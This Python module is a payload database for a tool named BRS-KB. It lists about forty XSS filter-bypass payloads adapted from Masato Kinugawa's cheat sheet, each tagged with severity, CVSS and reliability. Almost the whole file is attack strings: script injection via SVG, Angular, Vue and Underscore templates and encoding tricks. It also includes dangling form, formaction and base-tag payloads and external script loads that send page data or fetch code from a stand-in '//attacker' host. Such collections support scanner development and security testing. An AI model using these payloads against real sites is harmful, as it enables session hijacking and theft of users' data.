#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

Source: https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
Masato Kinugawa's XSS Filter Bypass Cheat Sheet
XSS Auditor (Chrome/Safari) and XSS Filter (IE/Edge) bypasses
"""

from ..models import PayloadEntry


BRS_KB_KINUGAWA_FILTERBYPASS_DATABASE = {
    # ===== SVG ANIMATION VALUES (Safari only) =====
    "kinugawa_svg_values_001": PayloadEntry(
        payload="<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a>",
        contexts=["html_content", "svg"],
        tags=["kinugawa", "safari", "svg", "animate", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="SVG animate values bypass (Safari)",
        reliability="medium",
    ),
    "kinugawa_svg_values_002": PayloadEntry(
        payload="<svg><animate xlink:href=#x attributeName=href from=javascript:alert(1) to=1 /><a id=x><rect width=100 height=100 /></a>",
        contexts=["html_content", "svg"],
        tags=["kinugawa", "safari", "svg", "animate", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="SVG animate from bypass (Safari)",
        reliability="medium",
    ),
    # ===== MULTIPLE NULL BYTES (Safari only) =====
    "kinugawa_null_001": PayloadEntry(
        payload="<script\\x00\\x00>alert(1)</script>",
        contexts=["html_content"],
        tags=["kinugawa", "safari", "null", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Multiple null bytes bypass (Safari)",
        reliability="low",
    ),
    # ===== SCRIPT --> COMMENT (Safari only) =====
    "kinugawa_comment_001": PayloadEntry(
        payload="-->alert(1)</script>",
        contexts=["javascript"],
        tags=["kinugawa", "safari", "comment", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Script --> comment bypass (Safari)",
        reliability="medium",
    ),
    # ===== DANGLING BASE TAG (Safari only) =====
    "kinugawa_base_001": PayloadEntry(
        payload='<base href="//attacker/',
        contexts=["html_content"],
        tags=["kinugawa", "safari", "base", "dangling", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Dangling base tag (Safari)",
        reliability="medium",
    ),
    # ===== ISO-2022-JP ESCAPE SEQUENCE =====
    "kinugawa_iso2022_001": PayloadEntry(
        payload='%1B(J"><script>alert(1)</script>',
        contexts=["html_content"],
        tags=["kinugawa", "encoding", "iso2022jp", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="ISO-2022-JP escape sequence bypass",
        reliability="low",
    ),
    "kinugawa_iso2022_002": PayloadEntry(
        payload='%1B$@"><script>alert(1)</script>',
        contexts=["html_content"],
        tags=["kinugawa", "encoding", "iso2022jp", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="ISO-2022-JP JIS escape bypass",
        reliability="low",
    ),
    # ===== SAME DOMAIN RESOURCE ABUSE =====
    "kinugawa_same_domain_001": PayloadEntry(
        payload='<script src="/path/to/usercontrolled.js"></script>',
        contexts=["html_content"],
        tags=["kinugawa", "same_domain", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Same domain script bypass",
        reliability="high",
    ),
    # ===== PATH XSS (Chrome only) =====
    "kinugawa_path_001": PayloadEntry(
        payload='<link rel=stylesheet href="/"><img src=1 onerror=alert(1)//',
        contexts=["html_content"],
        tags=["kinugawa", "chrome", "path", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Path XSS bypass (Chrome)",
        reliability="medium",
    ),
    # ===== FILE UPLOAD BYPASS =====
    "kinugawa_upload_001": PayloadEntry(
        payload='<script src="/upload/userfile.txt"></script>',
        contexts=["html_content"],
        tags=["kinugawa", "upload", "filter_bypass"],
        severity="critical",
        cvss_score=9.0,
        description="Uploaded file script bypass",
        reliability="high",
    ),
    # ===== FLASH + FLASHVARS BYPASS =====
    "kinugawa_flash_001": PayloadEntry(
        payload='<embed src=//example.com/xss.swf flashvars="a])}catch(e){alert(1)}//=1">',
        contexts=["html_content"],
        tags=["kinugawa", "flash", "flashvars", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Flash flashvars bypass",
        reliability="low",
    ),
    # ===== EXTERNALINTERFACE.OBJECTID BYPASS =====
    "kinugawa_extintf_001": PayloadEntry(
        payload='<embed name="a])}catch(e){alert(1)}//" src=//example.com/xss.swf>',
        contexts=["html_content"],
        tags=["kinugawa", "flash", "externalinterface", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="ExternalInterface.objectID bypass",
        reliability="low",
    ),
    # ===== ANGULAR BYPASS =====
    "kinugawa_angular_001": PayloadEntry(
        payload="<div ng-app ng-csp>{{$new.constructor('alert(1)')()}}</div><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js></script>",
        contexts=["html_content", "angular"],
        tags=["kinugawa", "angular", "csp", "filter_bypass"],
        severity="critical",
        cvss_score=9.0,
        description="Angular ng-csp bypass",
        reliability="high",
    ),
    "kinugawa_angular_002": PayloadEntry(
        payload="<div ng-app ng-csp ng-click=$event.view.alert(1)>click<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js></script>",
        contexts=["html_content", "angular"],
        tags=["kinugawa", "angular", "event", "filter_bypass"],
        severity="critical",
        cvss_score=9.0,
        description="Angular $event.view bypass",
        reliability="high",
    ),
    # ===== VUE.JS BYPASS =====
    "kinugawa_vue_001": PayloadEntry(
        payload="<div id=app>{{_c.constructor('alert(1)')()}}</div><script src=//cdn.jsdelivr.net/vue/2.0.0-rc.3/vue.min.js></script><script>new Vue({el:'#app'})</script>",
        contexts=["html_content", "vue"],
        tags=["kinugawa", "vue", "filter_bypass"],
        severity="critical",
        cvss_score=9.0,
        description="Vue.js _c constructor bypass",
        reliability="high",
    ),
    # ===== JQUERY BYPASS =====
    "kinugawa_jquery_001": PayloadEntry(
        payload='<form class="x]" data-hierarchical="true"><input name="<img src=1 onerror=alert(1)>"></form><script src=//code.jquery.com/jquery-3.1.0.js></script><script>$.each($(\'.x\\\\]\'),function(){});</script>',
        contexts=["html_content"],
        tags=["kinugawa", "jquery", "selector", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="jQuery selector bypass",
        reliability="medium",
    ),
    # ===== UNDERSCORE.JS BYPASS =====
    "kinugawa_underscore_001": PayloadEntry(
        payload="<div id=a></div><script src=//cdnjs.cloudflare.com/ajax/libs/underscore.js/1.8.3/underscore-min.js></script><script>_.template('<%= alert(1) %>')();</script>",
        contexts=["html_content"],
        tags=["kinugawa", "underscore", "template", "filter_bypass"],
        severity="critical",
        cvss_score=9.0,
        description="Underscore.js template bypass",
        reliability="high",
    ),
    # ===== JSXTRANSFORMER/BABEL BYPASS =====
    "kinugawa_jsx_001": PayloadEntry(
        payload="<script type=text/jsx>{alert(1)}</script><script src=//cdnjs.cloudflare.com/ajax/libs/react/0.14.7/JSXTransformer.js></script>",
        contexts=["html_content"],
        tags=["kinugawa", "jsx", "react", "filter_bypass"],
        severity="critical",
        cvss_score=9.0,
        description="JSXTransformer bypass",
        reliability="medium",
    ),
    "kinugawa_babel_001": PayloadEntry(
        payload="<script type=text/babel>{alert(1)}</script><script src=//cdnjs.cloudflare.com/ajax/libs/babel-standalone/6.4.4/babel.min.js></script>",
        contexts=["html_content"],
        tags=["kinugawa", "babel", "filter_bypass"],
        severity="critical",
        cvss_score=9.0,
        description="Babel-standalone bypass",
        reliability="medium",
    ),
    # ===== DOCUMENT.WRITE DANGLING TAG (Chrome only) =====
    "kinugawa_docwrite_001": PayloadEntry(
        payload='<script src=/xss.js?a="<script>alert(1)//"></script>',
        contexts=["html_content"],
        tags=["kinugawa", "chrome", "document.write", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="document.write dangling tag (Chrome)",
        reliability="medium",
    ),
    # ===== DANGLING FORM TAG (Safari only) =====
    "kinugawa_form_001": PayloadEntry(
        payload="<form action=//attacker/ method=POST><input name=secret value=",
        contexts=["html_content"],
        tags=["kinugawa", "safari", "form", "dangling", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Dangling form tag info steal (Safari)",
        reliability="medium",
    ),
    # ===== IE/EDGE: XML NAMESPACE BYPASS (Edge only) =====
    "kinugawa_xmlns_001": PayloadEntry(
        payload='<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>',
        contexts=["html_content", "xml"],
        tags=["kinugawa", "edge", "xmlns", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="XML namespace script bypass (Edge)",
        reliability="medium",
    ),
    "kinugawa_xmlns_002": PayloadEntry(
        payload='<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//attacker/xss.js"/>',
        contexts=["html_content", "xml"],
        tags=["kinugawa", "edge", "xmlns", "external", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="XML namespace external script (Edge)",
        reliability="medium",
    ),
    # ===== HZ-GB-2312 ESCAPE SEQUENCE =====
    "kinugawa_hzgb_001": PayloadEntry(
        payload='~{!>"><script>alert(1)</script>',
        contexts=["html_content"],
        tags=["kinugawa", "encoding", "hzgb2312", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="HZ-GB-2312 escape bypass",
        reliability="low",
    ),
    # ===== NAVIGATION ENCODING BYPASS =====
    "kinugawa_nav_001": PayloadEntry(
        payload='<a href="//attacker/xss?&#x22;><script>alert(1)</script>">click</a>',
        contexts=["html_content", "href"],
        tags=["kinugawa", "navigation", "encoding", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Navigation encoding bypass",
        reliability="medium",
    ),
    # ===== ADOBE ACROBAT PLUGIN (IE only) =====
    "kinugawa_acrobat_001": PayloadEntry(
        payload='<embed type=application/pdf src="/xss.pdf#a])}catch(e){alert(1)}//=1">',
        contexts=["html_content"],
        tags=["kinugawa", "ie", "acrobat", "pdf", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Adobe Acrobat plugin bypass (IE)",
        reliability="low",
    ),
    # ===== XML CONTENT SNIFFING (IE only) =====
    "kinugawa_xmlsniff_001": PayloadEntry(
        payload='<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></html>',
        contexts=["xml"],
        tags=["kinugawa", "ie", "content_sniffing", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="XML content sniffing bypass (IE)",
        reliability="low",
    ),
    # ===== UTF-7 BOM (IE only) =====
    "kinugawa_utf7bom_001": PayloadEntry(
        payload='+/v8-"><script>alert(1)</script>',
        contexts=["html_content"],
        tags=["kinugawa", "ie", "utf7", "bom", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="UTF-7 BOM bypass (IE)",
        reliability="low",
    ),
    # ===== PXML (IE only) =====
    "kinugawa_pxml_001": PayloadEntry(
        payload="<?PXML><html><script>alert(1)</script></html>",
        contexts=["html_content", "xml"],
        tags=["kinugawa", "ie", "pxml", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="PXML processing instruction bypass (IE)",
        reliability="low",
    ),
    # ===== REFERER BYPASS =====
    "kinugawa_referer_001": PayloadEntry(
        payload='<iframe onload="contentWindow[0].location=\'//vulnerable/xss?q=<script>alert(1)</script>\'" src="//vulnerable/page?q=<iframe>"></iframe>',
        contexts=["html_content"],
        tags=["kinugawa", "referer", "iframe", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Referer-based bypass via iframe",
        reliability="high",
    ),
    # ===== SAME DOMAIN LINK BYPASS =====
    "kinugawa_link_001": PayloadEntry(
        payload='<a href="//vulnerabledomain/xss?q=%22><script>alert(1)</script>">click</a>',
        contexts=["html_content"],
        tags=["kinugawa", "same_domain", "link", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Same domain link navigation bypass",
        reliability="high",
    ),
    # ===== FORMACTION INFO STEAL =====
    "kinugawa_formaction_001": PayloadEntry(
        payload='"><button formaction=//attacker/>',
        contexts=["html_content", "html_attribute"],
        tags=["kinugawa", "formaction", "info_steal", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Formaction info steal bypass",
        reliability="high",
    ),
    # ===== OPTION TAG INFO STEAL =====
    "kinugawa_option_001": PayloadEntry(
        payload="<button formaction=form3>CLICK<select name=q><option>&lt;script>alert(1)&lt;/script>",
        contexts=["html_content"],
        tags=["kinugawa", "option", "info_steal", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Option tag info steal bypass",
        reliability="medium",
    ),
    # ===== EMPTY IFRAME BYPASS =====
    "kinugawa_iframe_001": PayloadEntry(
        payload='<iframe onload="contentWindow[0].location=\'//vulnerabledoma.in/bypass/text?q=<script>alert(location)</script>\'" src="//vulnerabledoma.in/bypass/text?q=%3Ciframe%3E"></iframe>',
        contexts=["html_content"],
        tags=["kinugawa", "iframe", "empty", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Empty iframe referer bypass",
        reliability="high",
    ),
    # ===== SVG STYLE ENTITY BYPASS =====
    "kinugawa_style_entity_001": PayloadEntry(
        payload="<svg><style>&commat;import'//attacker'</style>",
        contexts=["html_content", "svg", "css"],
        tags=["kinugawa", "svg", "style", "entity", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="SVG style entity bypass",
        reliability="medium",
    ),
    "kinugawa_style_entity_002": PayloadEntry(
        payload="<svg><style>@&bsol;0069mport'//attacker'</style>",
        contexts=["html_content", "svg", "css"],
        tags=["kinugawa", "svg", "style", "backslash", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="SVG style backslash entity bypass",
        reliability="medium",
    ),
    # ===== BEHAVIOR URL ENTITY (IE only) =====
    "kinugawa_behavior_001": PayloadEntry(
        payload="<p style=\"behavior&colon;url('/bypass/usercontent/xss.txt')\">test",
        contexts=["html_content", "css"],
        tags=["kinugawa", "ie", "behavior", "entity", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Behavior URL colon entity (IE)",
        reliability="low",
    ),
    "kinugawa_behavior_002": PayloadEntry(
        payload="<p style=\"behavior:url&lpar;'/bypass/usercontent/xss.txt')\">test",
        contexts=["html_content", "css"],
        tags=["kinugawa", "ie", "behavior", "entity", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Behavior URL lpar entity (IE)",
        reliability="low",
    ),
    # ===== CHARACTER DELETION BYPASS =====
    "kinugawa_deletion_001": PayloadEntry(
        payload="<scrREMOVEipt>alert(1)</scrREMOVEipt>",
        contexts=["html_content"],
        tags=["kinugawa", "deletion", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="String deletion bypass pattern",
        reliability="high",
    ),
    # ===== CHARACTER REPLACEMENT BYPASS =====
    "kinugawa_replace_001": PayloadEntry(
        payload="<scr&ipt>alert(1)</scr&ipt>",
        contexts=["html_content"],
        tags=["kinugawa", "replacement", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="String replacement bypass pattern",
        reliability="high",
    ),
    # ===== MULTIPLE INJECTION POINTS =====
    "kinugawa_multi_001": PayloadEntry(
        payload='"><!--',
        contexts=["html_attribute"],
        tags=["kinugawa", "multi_injection", "comment", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Multi injection point comment open",
        reliability="high",
    ),
    "kinugawa_multi_002": PayloadEntry(
        payload="--><script>alert(1)</script><!--",
        contexts=["html_content"],
        tags=["kinugawa", "multi_injection", "comment", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="Multi injection point comment close",
        reliability="high",
    ),
}

BRS_KB_KINUGAWA_FILTERBYPASS_TOTAL = len(BRS_KB_KINUGAWA_FILTERBYPASS_DATABASE)
